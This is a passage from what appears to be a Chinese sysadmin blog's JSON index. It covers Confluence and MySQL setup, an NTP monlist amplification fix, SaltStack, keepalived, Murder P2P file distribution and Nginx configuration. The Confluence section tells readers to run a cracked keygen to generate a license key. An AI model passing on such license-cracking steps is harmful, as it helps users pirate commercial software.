&#x2F;usr&#x2F;local&#x2F;web&#x2F;confluence&#x2F;confluence&#x2F;confluence&#x2F;WEB-INF&#x2F;lib&#x2F; cp Confluence-5.6.6-language-pack-zh_CN.jar &#x2F;usr&#x2F;local&#x2F;web&#x2F;confluence&#x2F;confluence&#x2F;confluence&#x2F;WEB-INF&#x2F;lib&#x2F; cp mysql-connector-java-5.1.39-bin.jar &#x2F;usr&#x2F;local&#x2F;web&#x2F;confluence&#x2F;confluence&#x2F;confluence&#x2F;WEB-INF&#x2F;lib&#x2F; Web配置 1234567891011121314151617(1)Web配置 启动服务：&#x2F;etc&#x2F;init.d&#x2F;confluence start 访问：http:&#x2F;&#x2F;server_ip:8090 选择“Production Installation”方式--&gt;Start setup进入输入激活码页面 好，接下来在windows上操作(前提：java环境配置好) 打开cmd--进入解压后的confluence5.6.6-crack目录，执行命令:java -jar confluence_keygen.jar,在弹出的窗口中输入Web页面的ServerID等信息获取License Key,最后粘贴到Web页面中。 (2)选择Mysql数据库-- External Database -- Direct JDBC -- 输入mysql账号和密码 -- Next注：如果安装的是MySQL5.7,此处会出现“InnoDB”错误，需要在&#x2F;etc&#x2F;my.ini文件中添加一行，然后重启mysql服务添加：default-storage-engine&#x3D;InnoDB(3)然后选择“Empty Site” -- Manage Users and groups within Confluence -- 新建Web管理员账户 -- 完成用户前台页面：http:&#x2F;&#x2F;Server-IP:8090&#x2F;dashboard.action管理员控制台：http:&#x2F;&#x2F;Server-IP:8090&#x2F;admin&#x2F;console.action 故障处理 123456789101112创建空间后发现有中文乱码，修改下mysql的配置文件即可。[root@localhost web2016]#vi &#x2F;etc&#x2F;my.cnf[client]default-character-set&#x3D;utf8[mysqld]character-set-server&#x3D;utf8重启mysqld&#x2F;etc&#x2F;init.d&#x2F;mysqld restart查看mysql字符集是否已经更正&gt; show variables like &#39;character_set%&#39;;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"confluence","slug":"confluence","permalink":"https://garywu520.github.io/tags/confluence/"},{"name":"mysql二进制安装","slug":"mysql二进制安装","permalink":"https://garywu520.github.io/tags/mysql%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E8%A3%85/"},{"name":"jdk二进制安装","slug":"jdk二进制安装","permalink":"https://garywu520.github.io/tags/jdk%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E8%A3%85/"},{"name":"团队协作","slug":"团队协作","permalink":"https://garywu520.github.io/tags/%E5%9B%A2%E9%98%9F%E5%8D%8F%E4%BD%9C/"}]},{"title":"ntp漏洞修复","slug":"ntp漏洞修复","date":"2017-10-16T07:50:29.000Z","updated":"2017-10-16T07:59:00.631Z","comments":true,"path":"2017/10/16/ntp漏洞修复/","link":"","permalink":"https://garywu520.github.io/2017/10/16/ntp%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/","excerpt":"CVE-2013-5211漏洞说明: 12345CVE-2013-5211最早公布是2014年1月10日，由于NTP本身不会验证发送者的源ip地址。这就类似于DNS解析器使用的DRDoS（分布式反射型拒绝服务攻击）。攻击者HACK发送了一个伪造报文发送给NTP服务器Server A，将数据包中的源ip地址改成了受害者Client A的ip地址。NTP服务器Server A会响应这个请求，相对于初始请求，响应包发送的字节数是一个被放大的量，导致受害者Client A被dos攻击。最高的两个消息类型：REQ_MON_GETLIST 和REQ_MON_GETLIST_1，通过高达3660和5500的一个因素分别放大原始请求。","text":"CVE-2013-5211漏洞说明: 12345CVE-2013-5211最早公布是2014年1月10日，由于NTP本身不会验证发送者的源ip地址。这就类似于DNS解析器使用的DRDoS（分布式反射型拒绝服务攻击）。攻击者HACK发送了一个伪造报文发送给NTP服务器Server A，将数据包中的源ip地址改成了受害者Client A的ip地址。NTP服务器Server A会响应这个请求，相对于初始请求，响应包发送的字节数是一个被放大的量，导致受害者Client A被dos攻击。最高的两个消息类型：REQ_MON_GETLIST 和REQ_MON_GETLIST_1，通过高达3660和5500的一个因素分别放大原始请求。 解决方案： 1放大反射dos攻击由CVE-2013-5211所致。且这漏洞是与molist功能有关。Ntpd4.2.7p26之前的版本都会去响应NTP中的 mode7“monlist”请求。NTP 包含一个 monlist 功能，也被称为 MON_GETLIST，主要用于监控 NTP 服务器，NTP 服务器响应 monlist 后就会返回与 NTP 服务器进行过时间同步的最后 600 个客户端的 IP，响应包按照每6个IP 进行分割，最多有 100 个响应包。ntpd-4.2.7p26版本后，“monlist”特性已经被禁止，取而代之的是“mrulist”特性，使用 mode6控制报文，并且实现了握手过程来阻止对第三方主机的放大攻击。 操作步骤： 123456789echo &quot;disable monitor&quot; &gt;&gt; &#x2F;etc&#x2F;ntp.conf# &#x2F;etc&#x2F;init.d&#x2F;ntpd restart #重启ntp服务验证：运行 # ntpdcntpdc&gt; monlist***Server reports data not foundntpdc&gt;此时monlist已经被禁止了，也不会影响其时间同步 。 123或者在配置文件中增加以下两行并重启ntp服务：restrict default kod nomodify notrap nopeer noqueryrestrict -6 default kod nomodify notrap nopeer noquery 建议 123如果线上环境允许，还是建议升级ntp到最新版本官网：http:&#x2F;&#x2F;www.ntp.org&#x2F;downloads.html","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"肉鸡","slug":"肉鸡","permalink":"https://garywu520.github.io/tags/%E8%82%89%E9%B8%A1/"},{"name":"ntp漏洞","slug":"ntp漏洞","permalink":"https://garywu520.github.io/tags/ntp%E6%BC%8F%E6%B4%9E/"},{"name":"漏洞修复","slug":"漏洞修复","permalink":"https://garywu520.github.io/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/"},{"name":"补丁升级","slug":"补丁升级","permalink":"https://garywu520.github.io/tags/%E8%A1%A5%E4%B8%81%E5%8D%87%E7%BA%A7/"}]},{"title":"SaltStack部署for CentOS7","slug":"SaltStack部署for-CentOS7","date":"2017-10-14T10:49:21.000Z","updated":"2017-10-22T01:39:01.509Z","comments":true,"path":"2017/10/14/SaltStack部署for-CentOS7/","link":"","permalink":"https://garywu520.github.io/2017/10/14/SaltStack%E9%83%A8%E7%BD%B2for-CentOS7/","excerpt":"SaltStack扫盲 1SaltStack是一个服务器基础架构集中化管理平台，具备配置管理、远程执行、监控等功能，一般可以理解为简化版的puppet和加强版的func。SaltStack基于Python语言实现，结合轻量级消息队列（ZeroMQ）与Python第三方模块（Pyzmq、PyCrypto、Pyjinjia2、python-msgpack和PyYAML等）构建。","text":"SaltStack扫盲 1SaltStack是一个服务器基础架构集中化管理平台，具备配置管理、远程执行、监控等功能，一般可以理解为简化版的puppet和加强版的func。SaltStack基于Python语言实现，结合轻量级消息队列（ZeroMQ）与Python第三方模块（Pyzmq、PyCrypto、Pyjinjia2、python-msgpack和PyYAML等）构建。 1通过部署SaltStack环境，我们可以在成千上万台服务器上做到批量执行命令，根据不同业务特性进行配置集中化管理、分发文件、采集服务器数据、操作系统基础及软件包管理等，SaltStack是运维人员提高工作效率、规范业务配置与操作的利器。 saltstack工作原理 1234567891011121314151617salt-master服务启动后会开启两个端口:4505和4506，minion没有端口，通过“双向密钥交换”(可通过tree &#x2F;etc&#x2F;salt&#x2F;pki命令查看)来实现安全管理。salt-master每执行一条命令，所有minion均可收到，但只要指定的minion进行应答。[root@linux-node1 salt]# lsof -n -i:4505COMMAND PID USER FD TYPE DEVICE SIZE&#x2F;OFF NODE NAMEsalt-mast 11289 root 13u IPv4 58611 0t0 TCP 192.168.56.11:4505 (LISTEN)salt-mast 11289 root 15u IPv4 61320 0t0 TCP 192.168.56.11:4505-&gt;192.168.56.12:50292 (ESTABLISHED)salt-mast 11289 root 16u IPv4 69915 0t0 TCP 192.168.56.11:4505-&gt;192.168.56.11:59634 (ESTABLISHED)salt-mini 14050 root 25u IPv4 69914 0t0 TCP 192.168.56.11:59634-&gt;192.168.56.11:4505 (ESTABLISHED)由此可以看到，所有的minion都与master通信，而回复的时候，master则使用4506端口[root@linux-node1 salt]# lsof -n -i:4506COMMAND PID USER FD TYPE DEVICE SIZE&#x2F;OFF NODE NAMEsalt-mast 11301 root 21u IPv4 58619 0t0 TCP 192.168.56.11:4506 (LISTEN)salt-mast 11301 root 28u IPv4 61319 0t0 TCP 192.168.56.11:4506-&gt;192.168.56.12:52042 (ESTABLISHED)salt-mast 11301 root 29u IPv4 69847 0t0 TCP 192.168.56.11:4506-&gt;192.168.56.11:35406 (ESTABLISHED)salt-mini 14050 root 14u IPv4 69846 0t0 TCP 192.168.56.11:35406-&gt;192.168.56.11:4506 (ESTABLISHED) saltstack三种运行方式 123- local 本地运行- Master&#x2F;Minion 服务端&#x2F;agent方式- Salt SSH 不需要安装agent 安装 环境 1234系统: CentOS7主机：saltstack-master 192.168.56.11saltstack-minion 192.168.56.12 一、安装epel yum源123yum -y install epel-release yum clean all yum makecache 二、安装saltstack-master并配置123456789101112131415161718192021saltstack-master 安装：yum -y install salt-master salt-minion1.配置： 修改 salt-master 本身监听地址(注：配置文件内不允许TAB键) vim &#x2F;etc&#x2F;salt&#x2F;master 添加如下行： interface: 192.168.56.11 2. 配置：指定salt-master地址(注：配置文件内不允许TAB键) vim &#x2F;etc&#x2F;salt&#x2F;minion 添加如下行： master: 192.168.56.11 #id: 3.启动 systemctl restart salt-master systemctl status salt-master systemctl enable salt-master systemctl restart salt-minion systemctl status salt-minion systemctl enable salt-minion salt-master配置文件-参考： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647salt-master配置文件-参考：vim &#x2F;etc&#x2F;salt&#x2F;master # master的监听地址(注意:冒号后面空格) interface: 1.1.1.11 # salt运行的用户，影响到salt的执行权限 user: root # master自动接收客户端的验证 auto_accept: True # salt的运行线程，开的线程越多一般处理的速度越快，但一般不要超过CPU的个数 worker_threads: 8 # master的管理端口 publish_port : 4505 # master跟minion的通讯端口，用于文件服务，认证，接受返回结果等 ret_port : 4506 # 如果这个master运行的salt-syndic连接到了一个更高层级的master,那么这个参数需要配置成连接到的这个高层级master的监听端口 syndic_master_port : 4506 # 指定pid文件位置 pidfile: &#x2F;var&#x2F;run&#x2F;salt-master.pid # saltstack 可以控制的文件系统的开始位置 root_dir: &#x2F; # 日志文件地址 log_file: &#x2F;var&#x2F;log&#x2F;salt&#x2F;master.log # 分组设置 nodegroups: group_all: &#39;*&#39; # salt state执行时候的根目录 file_roots: base: - &#x2F;srv&#x2F;salt&#x2F;base # 设置pillar的根目录 pillar_roots: base: - &#x2F;srv&#x2F;salt&#x2F;pillar 三、安装saltstack-minion并配置1234567891011121314saltstack-minion 安装：yum install -y salt-minion1.配置： 修改salt-minion配置文件，指定salt-master地址(注：配置文件内不允许TAB键) vim &#x2F;etc&#x2F;salt&#x2F;minion 添加如下行： master: 192.168.56.11 #id: 注：id: hostname 用来指定主机名 2.启动 systemctl restart salt-minion systemctl status salt-minion systemctl enable salt-minion 四、在master测试saltstack12345671.查看minion列表（这时候saltstack-minion是红色的）[root@linux-node1 ~]# salt-key -LAccepted Keys:Denied Keys:Unaccepted Keys:linux-node2Rejected Keys: 123456782.认证所有key。当然也可以通过salt-key -a saltstack-minion指定某台minion进行认证key[root@linux-node1 ~]# salt-key -A #同意接管-管理所有minionThe following keys are going to be accepted:Unaccepted Keys:linux-node2Proceed? [n&#x2F;Y] YKey for minion linux-node2 accepted. 123456783. 接着继续查看minion列表（这时候saltstack-minion已经变为绿色，说明key已被添加）[root@linux-node1 ~]# salt-key -LAccepted Keys:linux-node2Denied Keys:Unaccepted Keys:Rejected Keys: 1234567891011121314154. 简单测试（客户端salt_ping）[root@linux-node1 ~]# salt &#39;*&#39; test.ping[root@linux-node1 ~]# salt \\* test.pinglinux-node1.example.com: Truelinux-node2: True 注：salt-master使用命令 salt &#39;linux-node2&#39; test.ping linux-node2: True此示例中所有的minion均已经收到了此消息，不过只有linux-node2进行了返回 salt缓存文件 12345目录：&#x2F;var&#x2F;cache&#x2F;saltcd &#x2F;var&#x2F;cache&#x2F;salt &amp;&amp; tree注：如果minion目标文件改变，重新salt后，master salt状态文件会覆盖minion节点文件，所以日后修改配置只需修改master salt状态文件即可。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"ansible","permalink":"https://garywu520.github.io/tags/ansible/"},{"name":"saltstack","slug":"saltstack","permalink":"https://garywu520.github.io/tags/saltstack/"},{"name":"自动化部署","slug":"自动化部署","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/"}]},{"title":"keepalived精讲","slug":"keepalived精讲","date":"2017-10-14T02:11:38.000Z","updated":"2017-10-14T08:44:11.541Z","comments":true,"path":"2017/10/14/keepalived精讲/","link":"","permalink":"https://garywu520.github.io/2017/10/14/keepalived%E7%B2%BE%E8%AE%B2/","excerpt":"keepalived功能 1231. 管理LVS负载均衡软件2. 实现对LVS集群节点健康检查功能3. 实现高可用功能","text":"keepalived功能 1231. 管理LVS负载均衡软件2. 实现对LVS集群节点健康检查功能3. 实现高可用功能 Keepalived高可用切换转移原理 1234567(1)利用VRRP协议进行主备通讯(2)利用VRRP协议进行主备竞选(根据优先级比较)(3)利用VRRP协议-主服务器向备服务器发送组播包(告诉备：我还活着，你不能抢占VIP)(4)利用VRRP协议-主和备通信一般使用明文传输，速度快(可以配置密文)。(3.1)一旦备服务器收不到主的组播包的时候，所有的备服务器间再次进行竞选，选择一个新主服务器(3.2)当主服务器恢复上线时，主服务器会抢占被服务器的资源 部署1234yum install -y keepalivedrpm -ql keepalivedkeepalived默认日志存放在系统日志：&#x2F;var&#x2F;log&#x2F;messages下 配置文件组成部分 123GLOBAL配置 #全局定义VRRP配置 #VRRP配置LVS配置 #LVS配置 keepalived配置文件–说明(默认) vim /etc/keepalived/keepalived.conf 1234567891011121314151617181920212223242526272829303132333435363738394041! Configuration File for keepalived #注释global_defs &#123; #全局配置标题 notification_email &#123; #定义管理员邮箱(当服务异常会给邮箱发送邮件,提前配置postfix等) 617597237@qq.com wuyanteng@sina.cn &#125; notification_email_from gaojing_keepalived@mail.com smtp_server smtp.qq.com #定义发件服务器 smtp_connect_timeout 30 #定义邮件发送超时时间 注：以上邮件配置可选，或者由zabbix邮件接管 router_id oldboy01 #局域网keepalived主机身份标识信息（同局域网标识唯一）&#125;########## 实例配置 ####################################################vrrp_instance VI_1 &#123; #VRRP协议相关配置(VIP地址设置) state MASTER #keepalived角色描述-值：MASTER或BACKUP (注意只是描述，不起到主备决定性作用) interface eth0 #表示在指定的网卡上生成VIP地址 virtual_router_id 51 #表示keepalived家族标识信息 （假设局域网有多套独立keepalived高可用集群，每个不同的keepalived集群的标识信息需要不同） priority 100 #keepalived服务竞选主备优先级设置,值越大越优先(官方建议比备优先级大于50)。 advert_int 1 #主服务组播包发送间隔时间,单位:秒 authentication &#123; #主备主机之间通讯认证机制 auth_type PASS #采用明文认证机制 auth_pass 1111 #编写明文密码 &#125; virtual_ipaddress &#123; #设置虚拟VIP地址信息（可以配置多个） 192.168.56.16&#x2F;24 dev eth0 label eth0:1 #后面的部分是自定义VIP设定后显示的信息 192.168.56.17 192.168.56.18 &#125;&#125;说明：主备服务器配置文件区别 01. router_id 不同 02. state BACKUP 不同 03. priority 不同 注：如果keepalived有多台备服务器，其他备服务器的配置文件只需调整优先级、router_id不同即可。 测试 1测试：进行Web访问和抓包观察配置效果；并且对比两个负载均衡服务器的配置文件 keepalived脑裂 1234什么情况下会产生脑裂？正常情况下，主向所有备发送组播包。突然有一天，主和备的心跳线坏了，但主服务扔运行正常，VIP还在。但备收不到主机的组播包会认为主挂了，此时，所有备重新选举后成为了新的VIP，但是原主VIP还在，此时就出现了一种VIP冲突的情况，这种情况下用户的访问请求将会受到影响，这种情况就成为脑裂。模拟脑裂可以在服务器开启iptables 导致脑裂原因 12345(1) 心跳线坏了(老化、断掉等)(2) 网卡及驱动坏了(3) 心跳线连接的设备故障(4) 高可用服务器上开启了iptables防火墙阻挡了心跳消息传输...... 脑裂监控方案 12345678910#### 制作监控脚本---在优先级较高的备节点添加运行监控报警的条件：只要lb02上面有vip:10.0.0.3就告警可能的情况：1.lb01挂了 2.脑裂#!&#x2F;bin&#x2F;bash#desc: jiankong lb02 vip if [ &#96;ip a s eth0 |grep -c &quot;10.0.0.3&quot;&#96; &#x3D;&#x3D; 1 ];then echo &quot;keepalived Master baojing&quot;fi 多实例-keepalived双主实现高可用流量分流1如果keepalived主 流量较大，所有备没有流量，这种情况下会导致资源浪费。如何让高可用进行分流呢？ 多实例-配置（keepalived双主-Nginx流量分流配置） keepalived-lb01配置 1234567891011121314151617181920212223242526272829303132global_defs &#123; router_id LVS_01&#125;vrrp_instance VI_1 &#123; state MASTER interface eth0 virtual_router_id 51 priority 150 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 10.0.0.3&#x2F;24 dev eth0 label eth0:1 &#125;&#125;vrrp_instance VI_2 &#123; state BACKUP interface eth0 virtual_router_id 52 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 10.0.0.4&#x2F;24 dev eth0 label eth0:2 &#125;&#125; keepalived-lb02配置 123456789101112131415161718192021222324252627282930313233global_defs &#123; router_id LVS_02&#125;vrrp_instance VI_1 &#123; state BACKUP interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 10.0.0.3&#x2F;24 dev eth0 label eth0:1 &#125;&#125;vrrp_instance VI_2 &#123; state MASTER interface eth0 virtual_router_id 52 priority 150 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 10.0.0.4&#x2F;24 dev eth0 label eth0:2 &#125; &#125; lb01和lb02-Nginx配置 12345678910111213141516171819202122232425262728293031323334353637383940414243配置nginx 负载均衡####lb01 lb02 nginx.conf worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; log_format main &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39; &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39; &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;; upstream server_pools &#123; server 10.0.0.7; server 10.0.0.8; server 10.0.0.9; &#125; server &#123; listen 10.0.0.3:80; server_name www.etiantian.org; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;server_pools; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; &#125; access_log logs&#x2F;access_www.log main;&#125; server &#123; listen 10.0.0.4:80; server_name blog.etiantian.org; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;server_pools; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; &#125;access_log logs&#x2F;access_blog.log main;&#125;&#125; 测试 12345windows hosts解析10.0.0.3 www.etiantian.org10.0.0.4 bbs.etiantian.org浏览器或抓包进行测试","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"keepalived","slug":"keepalived","permalink":"https://garywu520.github.io/tags/keepalived/"},{"name":"LVS","slug":"LVS","permalink":"https://garywu520.github.io/tags/LVS/"},{"name":"多实例","slug":"多实例","permalink":"https://garywu520.github.io/tags/%E5%A4%9A%E5%AE%9E%E4%BE%8B/"},{"name":"双主","slug":"双主","permalink":"https://garywu520.github.io/tags/%E5%8F%8C%E4%B8%BB/"},{"name":"脑裂","slug":"脑裂","permalink":"https://garywu520.github.io/tags/%E8%84%91%E8%A3%82/"}]},{"title":"在生产环境中-P2P分发大软件包的应用-Murder","slug":"在生产环境中P2P分发大软件包的应用-Murder","date":"2017-10-12T07:34:28.000Z","updated":"2017-10-13T04:02:42.847Z","comments":true,"path":"2017/10/12/在生产环境中P2P分发大软件包的应用-Murder/","link":"","permalink":"https://garywu520.github.io/2017/10/12/%E5%9C%A8%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%B8%ADP2P%E5%88%86%E5%8F%91%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%9A%84%E5%BA%94%E7%94%A8-Murder/","excerpt":"前言123为什么要使用 P2P 方式分发软件包?耗时小，效率高，所以考虑使用 P2P 方式来给大量机器分发大文件。P2P使用的工具为 Twitter 的开源工具 Murder（主要使用它封装好的 BT 下载工具）。","text":"前言123为什么要使用 P2P 方式分发软件包?耗时小，效率高，所以考虑使用 P2P 方式来给大量机器分发大文件。P2P使用的工具为 Twitter 的开源工具 Murder（主要使用它封装好的 BT 下载工具）。 实测数据12345分发 80M 文件到 800 台机器，P2P 方式耗时 2 分钟 29 秒，大大提高了大文件的分发速度。(PS：Murder 作者说他们 Twitter 当时提升是 75 倍！！我推测可能是它们使用内网的原因，我们这边使用的外网，因为机器在各个不同的机房。)Murder已经存在线上正式使用案例，可以部署使用。GitHub项目：https:&#x2F;&#x2F;github.com&#x2F;lg&#x2F;murder 架构图 部署分发环境测试环境123410.10.10.20 Tracker服务器10.10.10.21 Seeder服务器10.10.10.22 Peer下载节点1........ Peer下载节点n 部署 安装Murder [所有节点配置] 12345下载zip主程序: https:&#x2F;&#x2F;github.com&#x2F;lg&#x2F;murder, 解压 -- 文件夹更名为murder -- 重新压缩为murder.zip软件分发到各个机器上。unzip murder.zipmv murder &#x2F;usr&#x2F;local&#x2F; 1.启动Tracker服务器123456789#启动Tracker服务器，确保服务为启动状态python &#x2F;usr&#x2F;local&#x2F;murder&#x2F;dist&#x2F;murder_tracker.py &gt; &#x2F;var&#x2F;log&#x2F;murder_tracker.log 2&gt;&amp;1 &amp;#启动后，会自动开启8998端口[root@cm-master ~]# netstat -lntup|grep 8998tcp 0 0 0.0.0.0:8998 0.0.0.0:* LISTEN 29215&#x2F;python #查看P2P传输实时日志输出tailf &#x2F;var&#x2F;log&#x2F;murder_tracker.log 2.在Seeder服务器上准备好要分发的文件并创建种子123456789101112#准备好要分发的文件，并放在&#x2F;data&#x2F;upload目录下#定义临时变量deploy_file&#x3D;&#x2F;data&#x2F;upload&#x2F;CentOS-6.6-x86_64-minimal.iso#生成种子python &#x2F;usr&#x2F;local&#x2F;murder&#x2F;dist&#x2F;murder_make_torrent.py $&#123;deploy_file&#125; 10.10.10.20:8998 &#x2F;root&#x2F;fenfa.torrent#将生成的种子&#x2F;root&#x2F;fenfa.torrent文件分发到所有的peer目标节点上。注：格式如下python &#x2F;usr&#x2F;local&#x2F;murder&#x2F;dist&#x2F;murder_make_torrent.py $&#123;deploy_file&#125; $&#123;TrackerServer-IP&#125;:8998 $&#123;deploy_file&#125;.torrent 3.启动Seeder服务器123python &#x2F;usr&#x2F;local&#x2F;murder&#x2F;dist&#x2F;murder_client.py seed &#x2F;root&#x2F;fenfa.torrent $&#123;deploy_file&#125; 127.0.0.1注：启动的时候需要注意，torrent文件需要与原分发文件保持一致，否则会提示错误。 4.Peer节点执行P2P下载12345678910111213141516171819#P2P下载[root@cm-slave2 download]# time python &#x2F;usr&#x2F;local&#x2F;murder&#x2F;dist&#x2F;murder_client.py peer &#x2F;data&#x2F;download&#x2F;fenfa.torrent &#x2F;data&#x2F;download&#x2F;CentOS6.6.iso 10.10.10.22done and donereal 0m50.206suser 0m19.586ssys 0m6.981s#查看下载[root@cm-slave2 download]# ls -lh CentOS6.6.iso -rw-r--r-- 1 root root 383M Oct 12 16:19 CentOS6.6.iso可以看到，我的一个383M的文件，在内网通过P2P的方式传送，花费的时间是50s左右，可谓速度之快！！！注：下载格式python &#x2F;usr&#x2F;local&#x2F;murder&#x2F;dist&#x2F;murder_client.py peer &#x2F;data&#x2F;download&#x2F;deploy.tar.gz.torrent &#x2F;data&#x2F;download&#x2F;deploy.tar.gz $&#123;Peer_IP&#125; 5.文件下载完成后，关闭Seeder服务器进程123kill Seeder进程PID 避免它一直做种和提升安全性。以上就是分发软件包的整个流程。可以将上面的操作结合进自己的自动化运维平台。 参考：http://jaminzhang.github.io/p2p/Murder-download-test/","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Twitter","slug":"Twitter","permalink":"https://garywu520.github.io/tags/Twitter/"},{"name":"murder","slug":"murder","permalink":"https://garywu520.github.io/tags/murder/"},{"name":"软件分发","slug":"软件分发","permalink":"https://garywu520.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%88%86%E5%8F%91/"},{"name":"P2P分发","slug":"P2P分发","permalink":"https://garywu520.github.io/tags/P2P%E5%88%86%E5%8F%91/"}]},{"title":"Nginx配置文件-用法详解","slug":"Nginx配置文件-用法详解","date":"2017-09-28T06:07:47.000Z","updated":"2017-09-28T09:34:00.747Z","comments":true,"path":"2017/09/28/Nginx配置文件-用法详解/","link":"","permalink":"https://garywu520.github.io/2017/09/28/Nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/","excerpt":"Nginx配置文件-详解","text":"Nginx配置文件-详解 全局选项 123456789101112131415user www www; #定义Nginx运行的用户和用户组worker_processes 8; #定义nginx worker进程数。一般配置为与可用的CPU内核数相等或者配置成&quot;auto&quot;来自动检测。最多开启8个，8个以上性能就不会再提升了，而且稳定性会变的更低。worker_cpu_affinity 00000001 00000010 00000100 00001000 00010000 00100000 01000000 10000000;#配置利用8核CPU(默认没有开启)worker_rlimit_nofile 51200; #更改worker进程的最大打开文件数限制。如果没设置的话，这个值为操作系统的限制。设置后你的操作系统和Nginx可以处理比“ulimit -a”的值更多的文件，所以把这个值设高，这样nginx就不会有“too many open files”问题了。error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn;全局错误日志及错误日志定义等级，[ debug |info | notice | warn | error | crit ]pid &#x2F;var&#x2F;run&#x2F;nginx.pid #nginx进程文件 events模块 1234events&#123; use epoll; #复用客户端线程的轮询方法使用epoll的I&#x2F;O 模型 worker_connections 51200; #每个worker进程打开的最大连接数,与worker_rlimit_nofile一致即可。｝ HTTP模块 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960http &#123; include &#x2F;etc&#x2F;nginx&#x2F;mime.types; #文件扩展名与文件类型映射表,默认保存在conf&#x2F;mime.types中 default_type application&#x2F;octet-stream; #默认文件类型 charset utf-8; #设置默认编码 log_format main #定义日志格式 &#39;$remote_addr - $remote_user [$time_local] &#39; &#39;&quot;$request&quot; $status $bytes_sent &#39; &#39;&quot;$http_referer&quot; &quot;$http_user_agent&quot; &#39; &#39;&quot;$gzip_ratio&quot; &quot;$request_time&quot; &#39; &#39;&quot;$upstream_addr&quot; &quot;$upstream_status&quot; &quot;$upstream_response_time&quot;&#39;; server_names_hash_bucket_size 128; #服务器名字的hash表大小 client_header_buffer_size 2k; #为客户端请求头分配一个缓冲区,如果大小大于此值，则使用large_client_header_buffers分配的值 large_client_header_buffers 4 8k; client_max_body_size 25M; #设置NGINX能处理的最大请求主体大小。 如果请求大于指定的大小，则NGINX发回HTTP 413（Request Entity too large）错误。 如果服务器处理大文件上传，则该指令非常重要。 client_body_buffer_size 1024k; #一般设置1024即可 fastcgi_connect_timeout 1800; #指定连接到后端FastCGI的超时时间。 fastcgi_send_timeout 1800; #指定向FastCGI传送请求的超时时间（已经完成两次握手后的时间） fastcgi_read_timeout 1800; #nginx中fastcgi读取超时时间 fastcgi_buffer_size 1024k; #用于指定读取FastCGI应答第一部分需要用多大的缓冲区 fastcgi_buffers 32 1024k; #指定FastCGI的缓冲区大小 fastcgi_busy_buffers_size 2048k; #默认值是fastcgi_buffers的两倍 fastcgi_temp_file_write_size 2048k; #写入缓存文件时使用多大的数据块，默认为fastcgi_buffers的两倍 sendfile on; #开启高效文件传输模式 #autoindex on; #开启目录列表访问，合适下载服务器，默认关闭。 tcp_nopush on; #防止网络阻塞 tcp_nodelay on; #防止网络阻塞 keepalive_timeout 60; #长连接超时时间，单位是秒 gzip on; #开启gzip压缩输出 gzip_min_length 1100; #最小压缩文件大小 gzip_buffers 4 32k; #压缩缓冲区 gzip_comp_level 9; #压缩等级 gzip_types text&#x2F;plain application&#x2F;x-javascript text&#x2F;xml text&#x2F;css application&#x2F;json; #压缩类型 gzip_disable &quot;MSIE [1-6]\\.(?!.*SV1)&quot;; #不压缩IE ignore_invalid_headers on; #忽略不合法的http头部 server_tokens off; #是否在错误页面中显示nginx的版本号 server &#123; listen 127.0.0.1:80; server_name localhost; location &#x2F;NginxStatus &#123; stub_status on; &#125; &#125; index index.html, index.php; #定义首页文件 include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf; #引用conf.d目录中的配置以规范与简化管理 &#125; http中的server模块 12cd &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F; 单独配置虚拟主机,为简化管理，每个虚拟主机为独立*.conf配置文件 【前端机】vim game.garywu.com.conf 1234567891011121314151617181920212223242526272829303132333435upstream game_garywu &#123; server 192.168.50.140 max_fails&#x3D;3 fail_timeout&#x3D;10s; server 192.168.50.141 max_fails&#x3D;3 fail_timeout&#x3D;10s; server 192.168.50.142 max_fails&#x3D;3 fail_timeout&#x3D;10s; &#125;server &#123; listen 1.1.1.1:80; server_name game.garywu.com; root &#x2F;usr&#x2F;share&#x2F;html&#x2F;game.garywu.com; 